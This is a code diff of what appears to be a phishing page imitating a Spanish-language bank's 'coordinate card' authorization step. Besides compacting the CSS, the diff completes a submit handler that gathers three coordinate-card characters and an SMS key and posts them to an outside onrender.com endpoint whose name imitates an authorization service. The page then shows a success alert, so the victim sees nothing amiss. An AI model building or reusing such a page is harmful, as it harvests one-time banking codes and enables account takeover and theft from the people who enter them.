@@ -6,43 +6,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="styles.css">
   <style>
-    /* Ajustes básicos para móviles */
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .login-box {
-      max-width: 400px;
-      margin: auto;
-      padding: 20px;
-    }
-    input, select, button {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      box-sizing: border-box;
-    }
-    .coordenadas {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-    .coordenadas label {
-      font-weight: bold;
-    }
-    .footer-icons {
-      display: flex;
-      justify-content: space-around;
-      margin-top: 20px;
-    }
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+    .login-box { max-width: 400px; margin: auto; padding: 20px; }
+    input, select, button { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
+    .coordenadas { display: flex; flex-direction: column; gap: 10px; }
+    .coordenadas label { font-weight: bold; }
+    .footer-icons { display: flex; justify-content: space-around; margin-top: 20px; }
     @media (max-width: 480px) {
-      .login-box {
-        padding: 10px;
-      }
-      input, button, select {
-        font-size: 16px;
-      }
+      .login-box { padding: 10px; }
+      input, button, select { font-size: 16px; }
     }
   </style>
 </head>
@@ -95,11 +67,11 @@
       <form id="formCoordenadas" style="display:none;">
         <h4>Autorización por Coordenadas</h4>
         <div class="coordenadas">
-          <label>Coordenada A</label>
+          <label id="coordLabelA">Coordenada A</label>
           <input type="text" id="coordA" maxlength="1" required>
-          <label>Coordenada B</label>
+          <label id="coordLabelB">Coordenada B</label>
           <input type="text" id="coordB" maxlength="1" required>
-          <label>Coordenada C</label>
+          <label id="coordLabelC">Coordenada C</label>
           <input type="text" id="coordC" maxlength="1" required>
         </div>
         <div class="sms">
@@ -206,7 +178,7 @@
       }
     });
 
-    formCoordenadas.addEventListener("submit", async (e) => {
+         formCoordenadas.addEventListener("submit", async (e) => {
       e.preventDefault();
       const coordA = document.getElementById("coordA").value;
       const coordB = document.getElementById("coordB").value;
@@ -216,4 +188,23 @@
       const mensaje = `Autorización Coordenadas:
       Coordenada A: ${coordA}
       Coordenada B: ${coordB}
-      Coordenada C: ${
+      Coordenada C: ${coordC}
+      Clave SMS: ${claveSMS}`;
+
+      try {
+        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+
+        if (response.ok) {
+          alert("✅ Autorización enviada correctamente");
+        } else {
+          alert("⚠️ Error al procesar la autorización");
+        }
+      } catch (err) {
+        console.error("Error en autorización coordenadas:", err);
+        alert("❌ Error al enviar autorización");
+      }
+    });
